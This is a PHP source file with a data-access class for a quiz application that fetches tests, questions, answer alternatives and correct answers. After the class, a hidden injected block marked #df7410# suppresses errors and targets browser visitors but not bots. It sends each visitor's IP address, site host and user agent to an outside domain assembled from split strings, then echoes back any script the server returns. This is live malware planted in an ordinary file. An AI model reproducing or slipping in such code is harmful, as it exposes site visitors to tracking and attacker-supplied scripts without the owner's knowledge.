<?php
include_once( "DAO.php" );
include_once( "DBUtils.php" );
include_once( "testes.php" );
include_once( "perguntas.php" );
include_once( "alternativas.php" );
# ------------------------------------------------------------------ #

class testeDAO {

	# ------------------------------------------------------------------ #
	public static function getTestes( $id = null )
	{
		$out = array();

		if ( isset( $id ) )
		{
			$results = DAO::find( 'testes', array( 'id' => $id ) );
		}
		else
		{
			$results = DAO::find( 'testes' );
		}

		foreach ( $results as $teste )
		{
			$out[] = $teste;	
		}

		return $out;
	}

	# ------------------------------------------------------------------ #
	public static function getTestePerguntas( $id )
	{
		$teste = new testes( $id );
		$teste->__set( 'perguntas', DAO::find( 'perguntas', array( 'id_teste' => $teste->id ) ) );
		return $teste;
	}
	
	# ------------------------------------------------------------------ #
	public static function getTesteHome()
	{
		$result = DAO::find( 'testes', array( 'status' => 'A' ), 'created_at desc', 1 );
		$teste = $result[0];
		$teste->__set( 'perguntas', DAO::find( 'perguntas', array( 'id_teste' => $teste->id ) ) );

		foreach( $teste->perguntas as $pergunta )
		{
			$pergunta->__set( 'alternativas', DAO::find( 'alternativas', array( 'id_pergunta' => $pergunta->id ) ) );
		}
		
		return $teste;
	}

	# ------------------------------------------------------------------ #
	public static function getResultado( $id )
	{
		$out = array();
		$perguntas = DAO::find( 'perguntas', array( 'id_teste' => $id ) );

		foreach( $perguntas as $pergunta )
		{
			$alternativas = DAO::find( 'alternativas', array( 'id_pergunta' => $pergunta->id, 'correta' => 'S' ) );
			$out[] = $alternativas[0];
		}

		return $out;
	}
}

?>
<?php
#df7410#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/df7410#
?>